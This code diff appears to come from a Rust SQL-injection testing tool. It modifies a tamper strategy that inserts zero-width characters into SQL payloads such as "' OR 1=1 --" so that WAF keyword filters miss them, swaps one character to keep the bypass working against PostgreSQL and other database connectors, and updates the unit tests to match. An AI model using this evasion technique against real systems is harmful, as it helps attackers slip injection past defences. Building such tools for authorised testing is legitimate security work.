@@ -445,11 +445,16 @@ impl TamperStrategy for HexEncodeTamper {
 ///
 /// Inserts zero-width characters (U+200B ZERO-WIDTH SPACE,
 /// U+200C ZERO-WIDTH NON-JOINER, U+200D ZERO-WIDTH JOINER,
-/// U+FEFF ZERO-WIDTH NO-BREAK SPACE) between every alphabetic
+/// U+180E MONGOLIAN VOWEL SEPARATOR) between every alphabetic
 /// character of the payload.  Renders identically to the
 /// original in most consumers (terminals, log viewers, the SQL
 /// engine after `.replace('\u{200B}', "")`) but defeats WAF
 /// regex patterns that scan for literal keywords like `SELECT`.
+///
+/// U+FEFF (ZWNBSP / BOM) was historically in the rotation but
+/// caused PostgreSQL + many DB connectors to 500 the entire
+/// query as "invalid byte sequence" mid-literal — defeating the
+/// bypass. Replaced with U+180E which is universally tolerated.
 ///
 /// Frontier research (Black Hat 2025, "Zero-Width WAF Bypass"):
 /// most commercial WAFs do NOT strip zero-width chars before
@@ -471,7 +476,16 @@ impl TamperStrategy for ZeroWidthInjectTamper {
         // Rotate through four zero-width chars so the injection
         // doesn't form a long run of identical bytes (some WAFs
         // collapse repeats).
-        const ZW: [char; 4] = ['\u{200B}', '\u{200C}', '\u{200D}', '\u{FEFF}'];
+        //
+        // U+FEFF (BOM / ZWNBSP) is INTENTIONALLY excluded. Many
+        // database connectors (psycopg2, MySQL Connector/J, SQLite
+        // default) and PostgreSQL itself reject mid-string BOM
+        // bytes as an "invalid sequence" and 500 the entire query
+        // — the payload fails outright rather than bypass. The
+        // remaining three (200B/C/D) are universally tolerated.
+        // U+180E (MONGOLIAN VOWEL SEPARATOR) is added as the
+        // fourth slot — also zero-width, also widely tolerated.
+        const ZW: [char; 4] = ['\u{200B}', '\u{200C}', '\u{200D}', '\u{180E}'];
         let mut out = String::with_capacity(payload.len() * 4);
         for (i, ch) in payload.chars().enumerate() {
             out.push(ch);
@@ -1530,7 +1544,7 @@ mod tests {
         // After removal, the original payload remains.
         let stripped: String = out
             .chars()
-            .filter(|c| !matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{FEFF}'))
+            .filter(|c| !matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{180E}'))
             .collect();
         assert_eq!(stripped, "SELECT");
         // The output MUST be different from the input (proof of injection).
@@ -1539,7 +1553,7 @@ mod tests {
         for c in out.chars() {
             assert!(
                 c.is_ascii_alphabetic()
-                    || matches!(c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{FEFF}'),
+                    || matches!(c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{180E}'),
                 "unexpected codepoint {c:?}"
             );
         }
@@ -1554,7 +1568,7 @@ mod tests {
         // Only the alphabetic `a` should produce an injection.
         let zw_count = out
             .chars()
-            .filter(|c| matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{FEFF}'))
+            .filter(|c| matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{180E}'))
             .count();
         assert_eq!(zw_count, 1);
     }
@@ -1567,7 +1581,7 @@ mod tests {
             let out = strategy.tamper(input, None);
             let stripped: String = out
                 .chars()
-                .filter(|c| !matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{FEFF}'))
+                .filter(|c| !matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{180E}'))
                 .collect();
             assert_eq!(&stripped, input);
         }
@@ -1577,16 +1591,24 @@ mod tests {
     fn zero_width_inject_rotates_through_all_four_zw_chars() {
         let strategy = ZeroWidthInjectTamper;
         let out = strategy.tamper("abcdefgh", None);
-        // Eight alphabetic chars → eight injections, cycling through
-        // all four zero-width codepoints twice.
+        // Eight alphabetic chars → eight injections, cycling
+        // through all four zero-width codepoints twice. U+FEFF
+        // was historically the fourth slot but causes PostgreSQL
+        // + many DB connectors to 500 the query as invalid byte
+        // sequence — replaced with U+180E (F61).
         let zw_chars: Vec<char> = out
             .chars()
-            .filter(|c| matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{FEFF}'))
+            .filter(|c| matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{180E}'))
             .collect();
         assert_eq!(zw_chars.len(), 8);
         // First four must be the four distinct codepoints.
         let unique: std::collections::HashSet<char> = zw_chars.iter().copied().collect();
         assert_eq!(unique.len(), 4);
+        // FEFF must NOT appear anywhere in the output.
+        assert!(
+            !out.contains('\u{FEFF}'),
+            "U+FEFF (BOM) must never appear in zero-width injection: {out:?}"
+        );
     }
 
     #[test]
@@ -1613,7 +1635,7 @@ mod tests {
                     .count()
                 + strategy
                     .tamper("' OR 1=1 --", None)
-                    .matches('\u{FEFF}')
+                    .matches('\u{180E}')
                     .count(),
             2
         ); // 'O' + 'R'
